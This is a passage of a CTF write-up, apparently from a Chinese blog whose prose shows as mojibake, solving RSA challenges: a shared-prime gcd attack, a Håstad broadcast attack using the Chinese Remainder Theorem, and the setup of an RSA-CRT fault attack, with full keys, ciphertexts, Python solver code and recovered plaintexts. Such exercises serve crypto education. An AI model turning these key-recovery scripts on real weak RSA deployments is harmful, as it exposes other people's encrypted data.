class="hljs-number">25766855849012170602215974276512994665527760103232878510877708579134451117925205685988667478305686774909581308048305405982227012155215071376134036940929029662904505877622287438422321334710416342122246755031087867738529234615302073381335900455830870395122148361228482894414857023560773160530764583158671668598804795236806439696444767416669004606904236852625407455032822014231606087073213831281114887244532839729675040811323228917519504038450191315875150823702300759184612618800826323992940766242448628052050372979262990010935907002585341542207395142877707331416760094045455941053408610742527475497038936581984374880709</span><br>n2 = <span class="hljs-number">23029445296375982244621042067356938067600932656366159682913502418113458794974570308801738092925111529731228548404356478117663790755942048917363075846055763270676348368932404632553120873938932115409549042302048379540139242329521312179497517707113409555264863436910061516286482903931874204248958042186907817570230042112727883343124487662643844328226394430868012939455393801202299874213974171731230732650780391625138430545738601970201658394385606885566557862983885797334286100689371547075235155161498539779469617285566915877747705913072389949483202393235902365901491091866493162015415874138858126412365811099585224212299</span><br>p = gmpy2.gcd(n1,n2)<br><span class="hljs-keyword">assert</span> sympy.isprime(p)<br>q1 = n1//p<br>q2 = n2//p<br><br>e = <span class="hljs-number">65537</span><br><br>c1 = <span class="hljs-number">10525814866510137434899274998082698726988868256233514176953502719354264032410185277614127761527071749571758119230375451756494965691920242823875047761236402904697195895757175042349370909038642191817523007191322103279536254571467901947532676209111044078805574511874421763608159336854724603736343437950821917939678565773065914042640814861551433414991462029439854218529934675178281414333981877196921950767775395220428028907601554437040987071711361174143526222051997404012801968532202680596542050070864790765315160191871148699455255350919126797448710611287281082665133892808503848186989158095870812598832558333246789042676</span><br>c2 = <span class="hljs-number">15825489607550127439145806852385542839567883239057363905562871179426946402042942076016730509123999510531814642125437244542503343524213169970527943119058139473890975392849048101137592242977766658809403638381196910489834667796018783886181113320540459578692631939111357899549377553003879410941929489345106395564870136122987632435751994319822778186510306221275589605892748144352896531387710390605511956945032387237242470561632107510753242284083264220415607441731463294577007558615036100651711547573054889611720078234249393852435728233068931521415540782361953536967033384859985153392456809560643291691859128343066976633307</span><br><br>d1 = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>))<br>d2 = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(gmpy2.powmod(c1,d1,n1))<br><span class="hljs-built_in">print</span>(gmpy2.powmod(c2,d2,n2))<br><br><span class="hljs-comment"># 49298732203100844089802796111250631496813870200781244531168768869337723564648</span><br><span class="hljs-comment"># 49298732203100844089802796111250631496813870200781244531168768869337723564648</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flagä¸º</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;ready_some_attacks!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="advanced"><a class="markdownIt-Anchor" href="#advanced"></a> Advanced</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Challenge <span class="hljs-number">7</span>:<br><br>The modular arithmetic aspect of RSA is one of the main security<br>features that prevent trivial decryption of messages. It&#x27;s important<br>that the modulus n reduces the resulting value&#x27;s size. For example, if<br>the encrypting exponent were <span class="hljs-number">3</span> and the ciphertext were <span class="hljs-number">125</span> then a<br>simple cube root would reveal that the encrypted message was<br><span class="hljs-number">5</span>. Because of this, RSA is generally considered insecure when used<br><span class="hljs-string">&quot;raw&quot;</span> like in this challenge. Messages are supposed to be padded in<br>size so that <span class="hljs-number">5</span> becomes something like <span class="hljs-number">100000000</span>...<span class="hljs-number">000005</span>. Exact<br>padding schemes vary and are supposed to have some randomness to<br>them. Also, the encrypting exponent needs to be big enough that<br>encryption operations produce results many times the size of n so that<br>the modulus by n reduces them greatly. Finally, it&#x27;s important that<br>the same message is not encrypted with multiple keys. Using &quot;Chinese<br>Remainder Theorem&quot; (CRT) a message encrypted with multiple keys can be<br>reconstructed if the sum of the modulus size for all the key exceeds<br>the size of the encrypted result (pre-modulus).<br><br>In this challenge, the message getting encrypted is 64 bits and the<br>encrypting exponent is 101. This produces a result that is<br>approximately 101 * 64 = <span class="hljs-number">6500</span> bits. The message is then encrypted<br>with four different <span class="hljs-number">2048</span> bit RSA keys.  The four keys combined are<br>about <span class="hljs-number">8200</span> bits which is bigger than the <span class="hljs-number">6500</span> bit intermediate result<br>of the encryption operation.  Using CRT the <span class="hljs-number">6500</span> bit encrypted message<br>can be recovered and then the 101st integer root can be taken to<br>recover the original 64 bit message.<br><br><br>== Generated Public Key 1 ==<br>Public Modulus (n): <span class="hljs-number">23149105273119</span><span class="hljs-number">85662785009013</span><span class="hljs-number">69199297232618</span><span class="hljs-number">23943624757765</span><span class="hljs-number">17754921986623</span><span class="hljs-number">43844074439836</span><span class="hljs-number">91092738521031</span><span class="hljs-number">05320361447776</span><span class="hljs-number">66569867672862</span><span class="hljs-number">66446444753737</span><span class="hljs-number">59554494647221</span><span class="hljs-number">62245081613861</span><span class="hljs-number">71999255740873</span><span class="hljs-number">45014896855527</span><span class="hljs-number">75968939737976</span><span class="hljs-number">91032923207849</span><span class="hljs-number">75218931315694</span><span class="hljs-number">13773247651277</span><span class="hljs-number">16924091042774</span><span class="hljs-number">57861413785756</span><span class="hljs-number">31300210839317</span><span class="hljs-number">14855059086528</span><span class="hljs-number">31946400475595</span><span class="hljs-number">78757155989389</span><span class="hljs-number">14828284652002</span><span class="hljs-number">92057931675276</span><span class="hljs-number">01427487684976</span><span class="hljs-number">03128211200838</span><span class="hljs-number">06891058146672</span><span class="hljs-number">75587890468539</span><span class="hljs-number">80447659618327</span><span class="hljs-number">54837996582820</span><span class="hljs-number">36635116300846</span><span class="hljs-number">49428450353266</span><span class="hljs-number">65937689630253</span><span class="hljs-number">87116613116140</span><span class="hljs-number">77550561369584</span><span class="hljs-number">23942626477915</span><span class="hljs-number">35947985103955</span><span class="hljs-number">98348794151054</span><span class="hljs-number">50198617328366</span><span class="hljs-number">04865251347976</span><span class="hljs-number">51978877284141</span><span class="hljs-number">20981314262035</span>3<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">41330986748953</span><span class="hljs-number">64475122584859</span><span class="hljs-number">72793663631954</span><span class="hljs-number">21480847233851</span><span class="hljs-number">27010324327313</span><span class="hljs-number">78933439393020</span><span class="hljs-number">64580528703254</span><span class="hljs-number">62125129516244</span><span class="hljs-number">25965510329793</span><span class="hljs-number">79486156327169</span><span class="hljs-number">58036799846515</span><span class="hljs-number">78494359634465</span><span class="hljs-number">91710540994475</span><span class="hljs-number">20291118273021</span><span class="hljs-number">06405933685367</span><span class="hljs-number">10275569679724</span><span class="hljs-number">13169273404209</span><span class="hljs-number">75091948902661</span><span class="hljs-number">78285174609103</span><span class="hljs-number">31013223288149</span><span class="hljs-number">48599985060277</span><span class="hljs-number">75876714405786</span><span class="hljs-number">08610811039866</span><span class="hljs-number">90443140602256</span><span class="hljs-number">14533416055519</span><span class="hljs-number">48558124880741</span><span class="hljs-number">03375412353372</span><span class="hljs-number">14676252727142</span><span class="hljs-number">53906039692619</span><span class="hljs-number">12993919512256</span><span class="hljs-number">60280022301695</span><span class="hljs-number">31368415886389</span><span class="hljs-number">93502062756743</span><span class="hljs-number">56072099132405</span><span class="hljs-number">67022647994916</span><span class="hljs-number">86744403451572</span><span class="hljs-number">36365835994690</span><span class="hljs-number">39313449903333</span><span class="hljs-number">41338945724413</span><span class="hljs-number">87897888086656</span><span class="hljs-number">23522246598817</span><span class="hljs-number">64104264761900</span><span class="hljs-number">06352736111832</span><span class="hljs-number">24626880248944</span><br><br>== Generated Public Key 2 ==<br>Public Modulus (n): <span class="hljs-number">27505003639755</span><span class="hljs-number">30775537749990</span><span class="hljs-number">91167903166665</span><span class="hljs-number">59241048462052</span><span class="hljs-number">70883801902624</span><span class="hljs-number">58760613050325</span><span class="hljs-number">06336142607123</span><span class="hljs-number">27592814091606</span><span class="hljs-number">46236113212674</span><span class="hljs-number">78241118533648</span><span class="hljs-number">69108278020597</span><span class="hljs-number">56758489308910</span><span class="hljs-number">49661612587641</span><span class="hljs-number">41713473144209</span><span class="hljs-number">75491220528890</span><span class="hljs-number">52873494510311</span><span class="hljs-number">76361958124717</span><span class="hljs-number">50942254252953</span><span class="hljs-number">01201416148508</span><span class="hljs-number">86927065079594</span><span class="hljs-number">68822096281699</span><span class="hljs-number">16402212595347</span><span class="hljs-number">07239853677496</span><span class="hljs-number">42587656186833</span><span class="hljs-number">44988682136591</span><span class="hljs-number">52269185576547</span><span class="hljs-number">45918005510033</span><span class="hljs-number">56738950115475</span><span class="hljs-number">98621874886573</span><span class="hljs-number">82560403850181</span><span class="hljs-number">44667288963471</span><span class="hljs-number">02398598177639</span><span class="hljs-number">78346505291254</span><span class="hljs-number">10415157989610</span><span class="hljs-number">91324963800263</span><span class="hljs-number">04207592754247</span><span class="hljs-number">11122746274087</span><span class="hljs-number">21867458120376</span><span class="hljs-number">76284618799427</span><span class="hljs-number">06575343687840</span><span class="hljs-number">84664939872852</span><span class="hljs-number">15757590426438</span><span class="hljs-number">50479174348322</span><span class="hljs-number">70072515285917</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">17397873644269</span><span class="hljs-number">47826729125390</span><span class="hljs-number">01549804263364</span><span class="hljs-number">03459671349165</span><span class="hljs-number">42238682709304</span><span class="hljs-number">40894308814566</span><span class="hljs-number">74248458455179</span><span class="hljs-number">43847244192660</span><span class="hljs-number">15022531164336</span><span class="hljs-number">46786307394964</span><span class="hljs-number">48816122882054</span><span class="hljs-number">92241203700858</span><span class="hljs-number">07759713752907</span><span class="hljs-number">13350552018895</span><span class="hljs-number">74704775164826</span><span class="hljs-number">77384926622476</span><span class="hljs-number">30323384176319</span><span class="hljs-number">11439207486237</span><span class="hljs-number">04781240926838</span><span class="hljs-number">16850069295355</span><span class="hljs-number">09974648447000</span><span class="hljs-number">43930344936984</span><span class="hljs-number">12438690692636</span><span class="hljs-number">34639847733132</span><span class="hljs-number">48091868400957</span><span class="hljs-number">46501169042776</span><span class="hljs-number">27385768609767</span><span class="hljs-number">87686048652633</span><span class="hljs-number">46852531284195</span><span class="hljs-number">96824176903005</span><span class="hljs-number">70508715990174</span><span class="hljs-number">20069734395480</span><span class="hljs-number">51300699220934</span><span class="hljs-number">54863837154902</span><span class="hljs-number">67735794610384</span><span class="hljs-number">39968099787397</span><span class="hljs-number">56718909588287</span><span class="hljs-number">64776368371097</span><span class="hljs-number">80571608833277</span><span class="hljs-number">74751794582195</span><span class="hljs-number">85218216497145</span><span class="hljs-number">12337566044109</span><span class="hljs-number">47132788906749</span><span class="hljs-number">38571932381488</span><br><br>== Generated Public Key 3 ==<br>Public Modulus (n): <span class="hljs-number">23943992665005</span><span class="hljs-number">71691426574818</span><span class="hljs-number">13780440201632</span><span class="hljs-number">25463944348787</span><span class="hljs-number">13974762007049</span><span class="hljs-number">34410669813492</span><span class="hljs-number">14063664476165</span><span class="hljs-number">98843598582851</span><span class="hljs-number">31888933431550</span><span class="hljs-number">39302311995874</span><span class="hljs-number">37272735942965</span><span class="hljs-number">16394434422582</span><span class="hljs-number">95642274472710</span><span class="hljs-number">39842889311211</span><span class="hljs-number">01818830656767</span><span class="hljs-number">97050367135114</span><span class="hljs-number">33440910772058</span><span class="hljs-number">06743548463287</span><span class="hljs-number">95686014101403</span><span class="hljs-number">67061842988260</span><span class="hljs-number">39192818464392</span><span class="hljs-number">13906309422478</span><span class="hljs-number">55104688378505</span><span class="hljs-number">75161039300445</span><span class="hljs-number">93323333307553</span><span class="hljs-number">09144612029065</span><span class="hljs-number">14248398567498</span><span class="hljs-number">93243675869030</span><span class="hljs-number">84643416215076</span><span class="hljs-number">65965755219057</span><span class="hljs-number">31655641301802</span><span class="hljs-number">63619692031596</span><span class="hljs-number">70625478560592</span><span class="hljs-number">92665187665794</span><span class="hljs-number">38526375414146</span><span class="hljs-number">76293093903112</span><span class="hljs-number">39484966966962</span><span class="hljs-number">30404365543964</span><span class="hljs-number">24710226526474</span><span class="hljs-number">82083941901373</span><span class="hljs-number">18974693576706</span><span class="hljs-number">11227732745422</span><span class="hljs-number">40116211061429</span><span class="hljs-number">83203162744463</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">19767759825914</span><span class="hljs-number">12071348065438</span><span class="hljs-number">89130029076825</span><span class="hljs-number">84898016181997</span><span class="hljs-number">79332600032926</span><span class="hljs-number">95313315477447</span><span class="hljs-number">85734164928410</span><span class="hljs-number">15108683219817</span><span class="hljs-number">37746832148979</span><span class="hljs-number">41427775071585</span><span class="hljs-number">11490692162773</span><span class="hljs-number">60476102004141</span><span class="hljs-number">57221293720422</span><span class="hljs-number">17846031665756</span><span class="hljs-number">96896152896906</span><span class="hljs-number">67699532754041</span><span class="hljs-number">17277469003564</span><span class="hljs-number">18618410497349</span><span class="hljs-number">06636233903208</span><span class="hljs-number">02464107192038</span><span class="hljs-number">19805289627415</span><span class="hljs-number">03024268715672</span><span class="hljs-number">11143844866702</span><span class="hljs-number">61202562817198</span><span class="hljs-number">21441794618486</span><span class="hljs-number">57359704568147</span><span class="hljs-number">05875308709886</span><span class="hljs-number">50916524194457</span><span class="hljs-number">15105404565111</span><span class="hljs-number">68505608914143</span><span class="hljs-number">66638095586467</span><span class="hljs-number">35067798049443</span><span class="hljs-number">37515219575954</span><span class="hljs-number">86130004535388</span><span class="hljs-number">09288258159184</span><span class="hljs-number">16271780627368</span><span class="hljs-number">31925448026071</span><span class="hljs-number">81177622461258</span><span class="hljs-number">89946575846564</span><span class="hljs-number">78966565710308</span><span class="hljs-number">37156027293551</span><span class="hljs-number">70451675189199</span><span class="hljs-number">34363672571637</span><span class="hljs-number">20745382073790</span>8<br><br>== Generated Public Key 4 ==<br>Public Modulus (n): <span class="hljs-number">23764882147307</span><span class="hljs-number">05602700538692</span><span class="hljs-number">27719671580830</span><span class="hljs-number">00845038109106</span><span class="hljs-number">00377424942363</span><span class="hljs-number">21984858709214</span><span class="hljs-number">35962915038604</span><span class="hljs-number">25899236394268</span><span class="hljs-number">37144876771648</span><span class="hljs-number">40502159532488</span><span class="hljs-number">26224323842227</span><span class="hljs-number">19884472641077</span><span class="hljs-number">69115146700709</span><span class="hljs-number">76208812098742</span><span class="hljs-number">46702975260320</span><span class="hljs-number">23889996339452</span><span class="hljs-number">99892319968541</span><span class="hljs-number">27887488181760</span><span class="hljs-number">01822310309065</span><span class="hljs-number">99393671189573</span><span class="hljs-number">57169141435875</span><span class="hljs-number">37590216206044</span><span class="hljs-number">50135368905820</span><span class="hljs-number">58370895598999</span><span class="hljs-number">00836823313025</span><span class="hljs-number">04296318964395</span><span class="hljs-number">61784421085684</span><span class="hljs-number">22925457393179</span><span class="hljs-number">57255342016508</span><span class="hljs-number">42073996264074</span><span class="hljs-number">06447085305010</span><span class="hljs-number">96116668796229</span><span class="hljs-number">21360797855316</span><span class="hljs-number">24901866292850</span><span class="hljs-number">56925378123392</span><span class="hljs-number">28104595540950</span><span class="hljs-number">09877264479825</span><span class="hljs-number">89207677512851</span><span class="hljs-number">95667240877038</span><span class="hljs-number">37984362767805</span><span class="hljs-number">72283429342365</span><span class="hljs-number">98256438233525</span><span class="hljs-number">93873758485964</span><span class="hljs-number">29810906249929</span>9<br>Encrypting Exponent (e): 101<br>Encrypted message (c): <span class="hljs-number">42005919129551</span><span class="hljs-number">99563979501872</span><span class="hljs-number">44732314661728</span><span class="hljs-number">57860174134570</span><span class="hljs-number">40833853096647</span><span class="hljs-number">25249528217675</span><span class="hljs-number">76673709648910</span><span class="hljs-number">89582307763252</span><span class="hljs-number">79333201411063</span><span class="hljs-number">46845772752415</span><span class="hljs-number">10438935460795</span><span class="hljs-number">62315889509950</span><span class="hljs-number">83565380225707</span><span class="hljs-number">72990943795127</span><span class="hljs-number">10117989182131</span><span class="hljs-number">25500405055973</span><span class="hljs-number">85238071003932</span><span class="hljs-number">12875165097651</span><span class="hljs-number">55863426662639</span><span class="hljs-number">03701969711589</span><span class="hljs-number">52951371564835</span><span class="hljs-number">41843946699828</span><span class="hljs-number">22015645429160</span><span class="hljs-number">86781397961114</span><span class="hljs-number">06093631122262</span><span class="hljs-number">86104769818496</span><span class="hljs-number">18876205056461</span><span class="hljs-number">22273783689677</span><span class="hljs-number">43343698409735</span><span class="hljs-number">24256768752348</span><span class="hljs-number">36138710735832</span><span class="hljs-number">01483076450563</span><span class="hljs-number">74164533769145</span><span class="hljs-number">67987233340038</span><span class="hljs-number">20025909864260</span><span class="hljs-number">55002560798727</span><span class="hljs-number">93049938984906</span><span class="hljs-number">53449697341369</span><span class="hljs-number">98936729321588</span><span class="hljs-number">60976870518018</span><span class="hljs-number">09614329388180</span><span class="hljs-number">44119880719580</span><span class="hljs-number">97088934589833</span><span class="hljs-number">28341875490575</span><br><br>The same message (m) was encrypted with all keys, what was the message?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´çš„æ˜¯ç”¨ä¸åŒçš„nå¯¹åŒä¸€mè¿›è¡Œå¤šç»„çš„åŠ å¯†ï¼Œä¼šé€ æˆæ˜æ–‡çš„æ³„éœ²ï¼Œå› ä¸ºè¿™æ ·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†æ¥æ±‚è§£å¯¹åº”çš„mã€‚</p><p>å…³äºä¸­å›½å‰©ä½™å®šç†ç½‘ä¸Šçš„èµ„æ–™å¾ˆå¤šè¿™é‡Œæˆ‘å°±ä¸å†èµ˜è¿°äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>e = <span class="hljs-number">101</span><br>n1 = <span class="hljs-number">23149105273119856627850090136919929723261823943624757765177549219866234384407443983691092738521031053203614477766656986767286266446444753737595544946472216224508161386171999255740873450148968555277596893973797691032923207849752189313156941377324765127716924091042774578614137857563130021083931714855059086528319464004755957875715598938914828284652002920579316752760142748768497603128211200838068910581466727558789046853980447659618327548379965828203663511630084649428450353266659376896302538711661311614077550561369584239426264779153594798510395598348794151054501986173283660486525134797651978877284141209813142620353</span><br>c1 = <span class="hljs-number">4133098674895364475122584859727936636319542148084723385127010324327313789334393930206458052870325462125129516244259655103297937948615632716958036799846515784943596344659171054099447520291118273021064059336853671027556967972413169273404209750919489026617828517460910331013223288149485999850602777587671440578608610811039866904431406022561453341605551948558124880741033754123533721467625272714253906039692619129939195122566028002230169531368415886389935020627567435607209913240567022647994916867444034515723636583599469039313449903333413389457244138789788808665623522246598817641042647619000635273611183224626880248944</span><br>n2 = <span class="hljs-number">27505003639755307755377499909116790316666559241048462052708838019026245876061305032506336142607123275928140916064623611321267478241118533648691082780205975675848930891049661612587641417134731442097549122052889052873494510311763619581247175094225425295301201416148508869270650795946882209628169916402212595347072398536774964258765618683344988682136591522691855765474591800551003356738950115475986218748865738256040385018144667288963471023985981776397834650529125410415157989610913249638002630420759275424711122746274087218674581203767628461879942706575343687840846649398728521575759042643850479174348322700725152859179</span><br>c2 = <span class="hljs-number">1739787364426947826729125390015498042633640345967134916542238682709304408943088145667424845845517943847244192660150225311643364678630739496448816122882054922412037008580775971375290713350552018895747047751648267738492662247630323384176319114392074862370478124092683816850069295355099746484470004393034493698412438690692636346398477331324809186840095746501169042776273857686097678768604865263346852531284195968241769030057050871599017420069734395480513006992209345486383715490267735794610384399680997873975671890958828764776368371097805716088332777475179458219585218216497145123375660441094713278890674938571932381488</span><br>n3 = <span class="hljs-number">23943992665005716914265748181378044020163225463944348787139747620070493441066981349214063664476165988435985828513188893343155039302311995874372727359429651639443442258295642274472710398428893112110181883065676797050367135114334409107720580674354846328795686014101403670618429882603919281846439213906309422478551046883785057516103930044593323333307553091446120290651424839856749893243675869030846434162150766596575521905731655641301802636196920315967062547856059292665187665794385263754141467629309390311239484966966962304043655439642471022652647482083941901373189746935767061122773274542240116211061429832031627444639</span><br>c3 = <span class="hljs-number">19767759825914120713480654388913002907682584898016181997793326000329269531331547744785734164928410151086832198173774683214897941427775071585114906921627736047610200414157221293720422178460316657569689615289690667699532754041172774690035641861841049734906636233903208024641071920381980528962741503024268715672111438448667026120256281719821441794618486573597045681470587530870988650916524194457151054045651116850560891414366638095586467350677980494433751521957595486130004535388092882581591841627178062736831925448026071811776224612588994657584656478966565710308371560272935517045167518919934363672571637207453820737908</span><br>n4 = <span class="hljs-number">23764882147307056027005386922771967158083000845038109106003774249423632198485870921435962915038604258992363942683714487677164840502159532488262243238422271988447264107769115146700709762088120987424670297526032023889996339452998923199685412788748818176001822310309065993936711895735716914143587537590216206044501353689058205837089559899900836823313025042963189643956178442108568422925457393179572553420165084207399626407406447085305010961166687962292136079785531624901866292850569253781233922810459554095009877264479825892076775128519566724087703837984362767805722834293423659825643823352593873758485964298109062499299</span><br>c4 = <span class="hljs-number">4200591912955199563979501872447323146617285786017413457040833853096647252495282176757667370964891089582307763252793332014110634684577275241510438935460795623158895099508356538022570772990943795127101179891821312550040505597385238071003932128751650976515586342666263903701969711589529513715648354184394669982822015645429160867813979611140609363112226286104769818496188762050564612227378368967743343698409735242567687523483613871073583201483076450563741645337691456798723334003820025909864260550025607987279304993898490653449697341369989367293215886097687051801809614329388180441198807195809708893458983328341875490575</span><br><br><span class="hljs-comment"># CRT</span><br>M = n1*n2*n3*n4<br>M1 = M//n1<br>M2 = M//n2<br>M3 = M//n3<br>M4 = M//n4<br>M1_ = gmpy2.invert(M1,n1)<br>M2_ = gmpy2.invert(M2,n2)<br>M3_ = gmpy2.invert(M3,n3)<br>M4_ = gmpy2.invert(M4,n4)<br>m_e = (c1*M1*M1_ + c2*M2*M2_ + c3*M3*M3_ + c4*M4*M4_) % M<br><br><span class="hljs-built_in">print</span>(gmpy2.iroot(m_e, e))<br><br><span class="hljs-comment"># (mpz(2703076773593937933), True)</span><br><span class="hljs-comment"># 2703076773593937933</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Challenge <span class="hljs-number">8</span>:<br><br>One <span class="hljs-keyword">of</span> the slowest aspects <span class="hljs-keyword">of</span> RSA encryption <span class="hljs-keyword">and</span> decryption operations<br><span class="hljs-keyword">is</span> the need <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> modular arithmetic mod n. The other operations<br>that are slow are the ones that use the decrypting exponent, d, since<br>d tends <span class="hljs-keyword">to</span> be quite <span class="hljs-keyword">large</span> <span class="hljs-keyword">like</span> n.<br><br>One common optimization <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> implement RSA operations mod p <span class="hljs-keyword">and</span> mod q<br><span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> use the Chinese Remainder Theorem <span class="hljs-keyword">to</span> assemble the smaller<br>results <span class="hljs-keyword">into</span> the final result mod n. This <span class="hljs-keyword">is</span> <span class="hljs-keyword">called</span> RSA-CRT.<br><br>Although RSA-CRT can be substantially faster than traditional RSA, it<br>requires saving p <span class="hljs-keyword">and</span> q <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> the private key <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> the<br>intermediate steps <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> an RSA operation use p <span class="hljs-keyword">and</span> q. <span class="hljs-keyword">If</span> a<br>hardware fault (<span class="hljs-keyword">like</span> a <span class="hljs-type">bit</span> flip) occurs during an operation <span class="hljs-keyword">with</span> p <span class="hljs-keyword">or</span><br>q there <span class="hljs-keyword">is</span> risk that p <span class="hljs-keyword">or</span> q could <span class="hljs-keyword">get</span> exposed <span class="hljs-keyword">in</span> the final calculation<br>result.<br><br><span class="hljs-keyword">In</span> this challenge, two signatures are provided. One signature <span class="hljs-keyword">is</span> <span class="hljs-keyword">valid</span><br><span class="hljs-keyword">and</span> the other signature was produced <span class="hljs-keyword">using</span> RSA-CRT <span class="hljs-keyword">with</span> a fault,<br>resulting <span class="hljs-keyword">in</span> an invalid signature.<br><br><span class="hljs-keyword">Using</span> the faulty signature you need <span class="hljs-keyword">to</span> recover the private key.<br><br>See https://eprint.iacr.org/<span class="hljs-number">2002</span>/<span class="hljs-number">073.</span>pdf <span class="hljs-keyword">for</span> a discussion <span class="hljs-keyword">of</span> this<br>issue <span class="hljs-keyword">and</span> section <span class="hljs-number">2.2</span> <span class="hljs-keyword">for</span> specifics.<br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">23154885630854261581442853508324093951285850590669895605587380575521607235130640544163038357995530183077307108610005939771651006915357243729445798049117319493254714109948731131702737721279228901692687894303893338872375856964797219358972744318545166050544352909134282184933180708435651918762591420996061517085207453652776549270709284644419226914688644151059035005050410930727981245377188391115441239955392677194034468965281888607451952614751181223872620212423712394604641694913836491081539520184795848120063846286690175706164225270915188223556103208363481609433822007116992669527079368460205470274996573363959160287149</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Signed Message (m): <span class="hljs-number">76589046204045860242452095050720941865379417190758198073582782077942829633646</span><br><br>Good Message Signature (s): <span class="hljs-number">17325267447814446311355159968784166643403597062830555186292278909407730058965908425047388536352948396884805415515011080230756248824282492130908750756123192695675198318659278263688404328209023590879438869601583177837203307625831869828767421917697572620208858182749108816360161491597773218856070998037376245034974546384410507173259914610628592075718146841935598464732970089109029209226228627059215763957981996096436107902541481923438970091699518171836243620582740860277567287363646182037455413444739511958943032953778117438478454480617990915477445067705592198996202631720932689361239443694873608130401548530381941318233</span><br><br>Bad Message Signature (s): <span class="hljs-number">15560881472440963776812355687263772526799224459493465055411530467812341984615805222376647328602748875265740363403184343010139401584450440120706769134393997687683465315417839518347583296628663097911219566569959436210328102687469397856364290519652485072922276969140055247679930269523169632492462567935396255717642826528934615993335270136129635684773184252764824838098967401117436037823782028218281686360820286858701887330347540973559854295889323011981842854554834266081896736088393072010095414016636556324175277435257379852551709036180461462719357770502022163873660878350507927593844159774420414635489802142702898337920</span><br><br><br>What <span class="hljs-keyword">is</span> the private decrypting exponent (d) <span class="hljs-keyword">for</span> the <span class="hljs-built_in">public</span> key?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´çš„æ˜¯å¦‚æœåœ¨ä½¿ç”¨RSA-CRTçš„æƒ…å†µä¸‹æˆ‘ä»¬çš„qï¼Œpå­˜åœ¨éšæœºçš„é”™è¯¯ï¼Œä¾‹å¦‚ä¸€ä¸ªæ¯”ç‰¹ä½çš„åè½¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ˜æ–‡å’Œé”™è¯¯çš„ç­¾åæ¥è§£å‡ºå¯¹åº”çš„ç§é’¥dã€‚</p><p>è¿™ä¸ªå®é™…ä¸Šæ˜¯ä¸€ä¸ªè®ºæ–‡é‡Œçš„æ”»å‡»æ–¹æ³•ã€‚</p><p><a 